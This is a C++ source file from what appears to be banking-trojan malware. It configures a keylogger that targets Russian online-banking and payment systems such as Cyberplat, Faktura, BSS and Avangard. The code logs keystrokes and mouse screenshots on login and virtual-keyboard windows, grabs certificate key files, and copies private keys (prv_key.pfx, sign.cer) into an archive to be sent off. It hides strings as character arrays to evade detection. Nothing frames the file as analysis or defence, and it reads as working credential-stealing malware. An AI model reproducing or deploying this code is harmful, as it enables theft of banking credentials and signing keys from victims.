// ---------------------------------------------------------------------------
#include <windows.h>

#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"

#include "Modules.h"

#include "InistWeb.cpp"
#include "FakturaWeb.cpp"
#include "AvangardWeb.cpp"

#include "BSSWeb.cpp"


//#include "BotDebug.h"

namespace KEYLOGSYSTEMS
{
	#include "DbgTemplates.h"
}

#define DBG KEYLOGSYSTEMS::DBGOutMessage<>

#ifdef SBERH
	#include "SberKeyLogger.h"
#endif

// ---------------------------------------------------------------------------


// ---------------------------------------------------------------------------

namespace Cyberplat
{

	//true - если файл является файлом ключем
static int GrabKeyFiles( FileGrabber::ParamEvent* e )
{
	DBG( "Cyberplat", "File: %s", e->fileName );
	m_lstrcpy( e->nameSend, "file.key" );
	return FileGrabber::SENDFILE | FileGrabber::STOPRECEIVER;;
}

static void Activeted( LPVOID Sender )
{
	DBG("Cyberplat", "Activeted");
	FileGrabber::Init(FileGrabber::CREATEFILEA);
	FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
	rv->FuncReceiver = GrabKeyFiles;
	rv->minSize = 400;
	rv->maxSize = 3000;
	rv->maska = "*oper*BEGIN*END*"; //файлы которые начинаются с BEGIN CERTIFICATE и заканчиваются END CERTIFICATE
	FileGrabber::AddReceiver(rv);
}

static void Deactivate( LPVOID Sender )
{
	DBG("Cyberplat", "Deactivate");	
	FileGrabber::Release();
}

	//http://www.cyberplat.ru/tech/online/
	//https://portal.cyberplat.ru/cgi-bin/login.cgi

static void Init()
{
	PKeyLogSystem S = KeyLogger::AddSystem("cyberplatweb", PROCESS_HASH_IE);
	if( S != NULL )
	{
		S->SendLogAsCAB = true;
		S->OnActivate = Cyberplat::Activeted;
		S->OnDeactivate = Cyberplat::Deactivate;
		S->AlwaysLogMouse = LOG_MOUSE_SCREENSHOT;
		char CyberplatCaption[] = {'И','д','е','н','т','и','ф','и','к','а','ц','и','я',' ','п','о','л','ь','з','о','в','а','т','е','л','я', 0};
		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, NULL, (PCHAR)CyberplatCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
		if( F1 )
		{
			PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, NULL, "*Клавиатура*", FILTRATE_PARENT_WND, LOG_MOUSE, 3);
			if( F2 )
			{
                F2->MouseLogWnd = MOUSE_LOG_WND_FILTER;
				F2->PreFilter = F1;
			}
		}
	}
}

}

// ---------------------------------------------------------------------------
void FakturaInitialize(LPVOID Sender) {
	// Метод инициализации фактуры

	// При инициализации фактуры копируем два файла в архив кейлогера
	const static char FukturaKey[] = {
		'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'F', 'T', 'C', '\\', 'S',
		'K', 'S', 'B', '\\', 'K', 'e', 'y', 'S', 't', 'o', 'r', 'a', 'g', 'e', 0
	};
	const static char File1[] = {
		'p', 'r', 'v', '_', 'k', 'e', 'y', '.', 'p', 'f', 'x', 0
	};
	const static char File2[] = {
		's', 'i', 'g', 'n', '.', 'c', 'e', 'r', 0
	};
	const static char InternalPath[] = {
		'K', 'e', 'y', 's', '\\', 0
	};

	// Первым делом проверяем ветку реестра в которой фактура прописывает
	// свои ключи
	bool FreePath = true;
	PCHAR Path = Registry::GetStringValue(HKEY_CURRENT_USER, (PCHAR)FukturaKey,
		NULL);

	// Если в реестре нет пути, то устанавливаем путь по умолчанию
	if (Path == NULL) {
		FreePath = false;
		Path = "A:\\";
	}

	// Определяем обратный слэш
	PCHAR Slash = NULL;
	PCHAR End = STR::End(Path);
	End--;
	if (*End != '\\')
		Slash = "\\";

	PCHAR F1 = STR::New(3, Path, Slash, (PCHAR)File1);
	PCHAR F2 = STR::New(3, Path, Slash, (PCHAR)File2);

	PCHAR IntF1 = STR::New(2, (PCHAR)InternalPath, (PCHAR)File1);
	PCHAR IntF2 = STR::New(2, (PCHAR)InternalPath, (PCHAR)File2);

	KeyLogger::AddFile(F1, IntF1, NULL, 0);
	KeyLogger::AddFile(F1, IntF2, NULL, 0);

	if (FreePath)
		STR::Free(Path);

	STR::Free(F1);
	STR::Free(F2);
	STR::Free(IntF1);
	STR::Free(IntF2);
}


// ---------------------------------------------------------------------------


void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp, const char* appName)
{
	// Функция регистрирует заранее известные системы кейлогера

	// Добавляем систему raif
	#ifdef RafaH
		Rafa::Init();
	#endif

	// Добавляем QWidjet
//	S = KeyLogger::AddSystem("qwidget", PROCESS_HASH_IE);
//	if (S != NULL)
//	{
//		char QWidgetClass[] = {'q', 'w', 'i', 'd', 'g', 'e', 't', 0};
//		KeyLogger::AddFilter(S, QWidgetClass, NULL, FILTRATE_PARENT_WND, LOG_ALL, 3);
//	}

	Cyberplat::Init();


	// Регистрируем систему для сбер
//	#ifdef SberKeyLoggerH
//		RegisterSberKeyLogger();
//	#endif

	// Добавляем систему IFOBS
//	S = KeyLogger::AddSystem("ifobs", PROCESS_HASH_IE);
//	if (S != NULL)
//	{
//		char JavaFrameClass[] = {'S', 'u', 'n', 'A', 'w', 't', 'F', 'r', 'a', 'm', 'e',  0};
//		KeyLogger::AddFilter(S, JavaFrameClass, NULL, FILTRATE_PARENT_WND, LOG_ALL, 4);
//    }


	#ifdef IBankSystemH
        RegisterIBankSystem(hashApp);
	#endif

	#ifdef InistWebModule
		InistWeb::Init();
	#endif

	#ifndef BSSH
		BSSWeb::Init();
	#endif


	// Добавляем систему фактура
	#ifdef FakturaWebModule
		FakturaWeb::Init();
	#endif

	#ifdef AvangardWebModule
		AvangardWeb::Init(); 
	#endif

	#ifdef IFobsH
		IFobs::Init(appName);
	#endif

	#ifdef TinyH
		Tiny::Init(appName);
	#endif

	#ifdef YandexH
		YandexSearchJpg::Init();
	#endif

	#ifdef CCH
		CC::Init(hashApp);
	#endif
}


//-------------------------------------------------------------
void StartKeyLogger(PCHAR AppName)
{
	//  Функция регистрирует заранее известные
	//	системы кейлогера и запускает его

	PKeyLogger P = KeyLogger::Initialize(AppName);
	if (!P) return;

	TKeyLoggerFilterData Data;
	ClearStruct(Data);

	Data.SSWidth = 40;
	Data.SSHeight = 40;

	RegisterAllKeyLoggerSystem(&Data, P->ProcessNameHash, AppName);



    KeyLogger::Start();
}
